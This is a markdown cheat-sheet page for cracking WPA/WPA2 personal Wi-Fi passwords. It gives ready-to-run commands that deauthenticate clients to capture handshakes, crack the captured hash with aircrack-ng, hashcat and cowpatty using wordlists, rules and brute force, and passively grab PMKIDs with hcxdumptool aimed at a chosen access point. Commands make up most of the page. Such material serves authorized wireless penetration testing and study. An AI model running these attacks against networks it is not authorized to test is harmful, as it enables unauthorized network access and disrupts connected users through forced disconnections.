---
title: "WPA / WPA2 (PSK)"
---

# WPA / WPA2 Personal

::: tip Overview
WPA/WPA2 Personal (also called WPA-PSK) uses a **Pre-Shared Key** for authentication. Unlike WEP, the key isn't used directly for encryption.
:::

::: details Lexicon

| Term      | Definition                                                            |
| --------- | --------------------------------------------------------------------- |
| **CCMP**  | AES-based encryption, 48-bit Packet Number → no IV reuse (WPA2)       |
| **TKIP**  | RC4-based with per-packet keys, 48-bit IV → fixes WEP IV reuse (WPA1) |
| **PSK**   | Pre-Shared Key - WiFi password (8-63 chars)                           |
| **PMK**   | Pairwise Master Key = `PBKDF2(PSK, SSID, 4096)`                       |
| **PMKID** | PMK Identifier - allows clientless handshake capture                  |

:::

## How WPA2-PSK Works

```php
PMK = PBKDF2(PSK, SSID, 4096 iterations)
↓
4-Way Handshake
(ANonce + SNonce + MACs)
↓
PTK = PRF(PMK + ANonce + SNonce + AP_MAC + STA_MAC)
↓
Encryption (CCMP/TKIP)
```

## Cracking MIC (4-Way Handshake)

### Capture Handshake

```bash
# Deauth client to force reconnection
aireplay-ng -0 5 -a $bssid -c $client_mac $interface
```

### Crack PSK

::: code-group

```bash [aircrack]
# Wordlist attack
aircrack-ng -w rockyou.txt -b $bssid handshake-01.cap
```

```bash [hashcat]
# Convert .cap to hashcat format
hcxpcapngtool -o hash.hc22000 handshake-01.cap

# Crack with wordlist + rules
hashcat -m 22000 hash.hc22000 rockyou.txt -r best64.rule

# Brute force (8 characters)
hashcat -m 22000 hash.hc22000 -a 3 ?a?a?a?a?a?a?a?a
```

:::

```bash
# Or with pyrit
pyrit -r handshake-01.cap analyze
```

## PMKID Attack

::: tip Why PMKID

- No clients required - AP only
- Passive - No deauth
- Works on WPA2 with PMKID caching (802.11r)

:::

::: details Packages Requirement

- [hcxpcapngtool (github)](https://github.com/ZerBea/hcxtools)

```bash
sudo apt install hcxtool hcxdumptool
```

:::

### Capture PMKID

```bash
# Using hcxdumptool (modern method)
hcxdumptool -i $interface -w capture.pcapng --rds=1

# Let it run for 1-2 minutes, then stop (Ctrl+C)
```

::: details hcxdumptool advanced

```bash
# Show details about interface
hcxdumptool -I $interface

# a = 2.4GHz, b = 5GHz, c = 6GHz, d = 60Ghz
sudo hcxdumptool -i $interface -c 10a -w capture.pcapng --rds=1 # Channel 10 on 2.4GHz
```

```bash
# Scan Specific BSSID
sudo hcxdumptool -i $interface --rcascan=p --rds=3 # Find target
echo "$bssid" | tr -d ':' | xargs -I {} sudo hcxdumptool --bpfc="wlan addr3 {}" > cible.bpf # Create BPF
sudo hcxdumptool -i $interface -c ${channel}a -w capture.pcapng --bpf=cible.bpf # Capture
```

:::

### Extract Hash

- [hcxpcapngtool (cap2hash) online](https://hashcat.net/cap2hashcat/index.pl)

```bash
# Convert to hashcat format
hcxpcapngtool -o pmkid.22000 capture.pcapng

# Crack
hashcat -m 22000 pmkid.22000 rockyou.txt
```

::: warning PMKID Requirements

- AP must support 802.11r (Fast BSS Transition) or PMKID caching

:::

### Bruteforce

```bash
# Generate PMK database for specific SSID
genpmk -f wordlist.txt -d pmk_$ssid.db -s "$ssid"

# Crack without computing PBKDF2 each attempt
cowpatty -d pmk_$ssid.db -r handshake-01.cap -s "$ssid"
```

## Resources

- [WPA2 PSK Attack](https://thr0cut.github.io/research/wifi-penetration-testing/#attacks-against-wpa2-psk)
- [WPA2 Wordlists](https://github.com/kennyn510/wpa2-wordlists/tree/master/Wordlists)